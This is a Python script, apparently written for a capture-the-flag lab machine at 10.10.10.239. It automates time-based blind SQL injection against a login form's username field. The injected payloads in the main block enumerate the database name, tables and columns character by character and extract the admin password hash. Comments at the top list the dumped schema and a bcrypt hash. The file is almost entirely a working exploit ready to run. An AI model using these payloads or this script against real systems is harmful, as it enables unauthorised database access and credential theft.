#!/usr/bin/python3
#coding: utf-8


# Blind SQL Automation Script
# Author: Gaizka Martin (a.k.a g2jz)


#Database:
#database_name = "votesystem"
#version = "10.4.18-mariadb"
#table_names = ["admin", "candidates","positions","voters","votes"]
#column_names_admin = ["id","username","password","firstname","lastname","photo","created"]
#column_names_candidates = ["id","position","firstname","lastname","platform"]
#column_names_positions = ["id","description","max","priority"]
#column_names_voters = ["id","voters","password","firstname","lastname","photo"]
#column_names_votes = ["id","voters","candidate","position"]
#user = ["1","admin","$2y$10$4e3vve2pwltmejqutmmd6.og9rmmfn.k5a1n99khndqxheputfjsc","neovic","devierte","facebook"]     NOT DECRYPTABLE
#user = ["2", ""]


import sys
import time
import re
import requests
import signal
import urllib
import pdb

from pwn import *


# Variables globales
main_url = "http://10.10.10.239/login.php"
s = r'abcdefghijklmnopqrstuvwxyz0123456789~!@#$%^&\*()__+={}][|`,./?;:"<>'
sleep = 10


# Barras de progeso
p1 = log.progress("Payload")


# Ctrl + C
def handler(sig, frame):
    log.failure("Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, handler)


# SQLi Request
def makeRequest(payload):

    # Sesión HTTP
    s = requests.session()
    
    headers = {
        "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
    }

    data = {
        'username' :  '%s' % payload,
        'password' : 'test',
        'login' : ''
    }

    oldTime = time.time()
    r = s.post(main_url, headers=headers, data=data, allow_redirects=True)
    newTime = time.time()

    s.close()

    if (newTime - oldTime) > sleep:
        return 1


# Dump database name
def database(payload):
    result = ''
    p = log.progress("Database name")
    
    for charPos in range(1,100):
        found = 0
        for char in s:
            formated = payload.format(charPos,char)
            p1.status(formated)
            if(makeRequest(formated)):
                result += char
                p.status(result)
                found = 1
                break
        if(found == 0):
            break
    p.success(result)
    return result


# Dump database tables
def table(payload):
    result = ''
    table_list = []
    for table in range(0,10):
        p = log.progress("Table [%d]" % table)
        for charPos in range(1,40):
            found = 0
            for char in s:
                formated = payload.format(table,charPos,char)
                p1.status(formated)
                if(makeRequest(formated)):
                    result += char
                    p.status(result)
                    found = 1
                    break
            if(found == 0):
                break
        table_list.append(result)
        p.success(result)
        result = ''
    return table_list


# Dump database columns
def column(payload, table_name):
    result = ''
    column_list = []
    for column in range(0,10):
        p = log.progress("Table [%s]" % table_name + "  Column [%d]" % column)
        for charPos in range(1,40):
            found = 0
            for char in s:
                formated = payload.format(column,charPos,char)
                p1.status(formated)
                if(makeRequest(formated)):
                    result += char
                    p.status(result)
                    found = 1
                    break
            if(found == 0):
                break
        column_list.append(result)
        p.success(result)
        result = ''
    return column_list


# Main
if __name__ == "__main__":
    try:
        # Database name
        database_payload = "' or if(substr(database(),{0},1)='{1}',sleep(%d),1)-- -" % sleep
        database_name = database(database_payload)
        

        # Table names
        if database_name is not None:
            tables_payload = "' or if(substr((select table_name from information_schema.tables where table_schema = '%s' limit {0},1),{1},1)='{2}',sleep(%d),1)-- -" % (database_name,sleep)
            table_names = table(tables_payload)


        # Column names
        column_names = []
        if table_names is not None:
            for table_name in table_names:
                    columns_payload = "' or if(substr((select column_name from information_schema.columns where table_schema='%s' and table_name='%s' limit {0},1),{1},1)='{2}',sleep(%d),1)-- -" % (database_name,table_name,sleep)
                    column_name = column(columns_payload,table_name)
                    column_name.append(table_name)
                    column_names.append(column_name)

        
        # Dump database data
        dump_payload = "' or if(substr((select password from admin where id='1'),{0},1)='{1}',sleep(%d),1)-- -" % (sleep)
        database(dump_payload)


        sys.exit(0)

    except Exception as e:
        log.failure("Ha habido un error: " + str(e))
        sys.exit(1)